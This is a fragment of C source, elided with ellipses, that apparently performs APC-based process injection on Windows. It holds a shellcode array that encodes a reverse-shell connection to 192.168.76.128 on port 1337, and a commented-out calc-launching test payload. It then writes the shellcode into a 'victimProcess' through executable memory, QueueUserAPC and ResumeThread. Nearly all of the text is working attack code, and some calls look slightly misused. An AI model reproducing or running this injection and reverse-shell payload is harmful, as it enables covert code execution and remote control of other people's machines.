...

{
    ...
    unsigned char buf[] = 
                            ...
                            "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x4c\x80\x68\x02"
                            "\x00\x05\x39\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
    ...
    // unsigned char buf[] =   "\xeB\x02\xBA\xC7\x93"
    //                         "\xBF\x77\xFF\xD2\xCC"
    //                         "\xE8\xF3\xFF\xFF\xFF"
    //                         "\x63\x61\x6C\x63";
    ...
    LPVOID shelladdress = VirtualAllocEx(victimProcess, NULL, shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shelladdress;

    WriteProcessMemory(victimProcess, shelladdress, buf, shellcode, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(victimProcess);
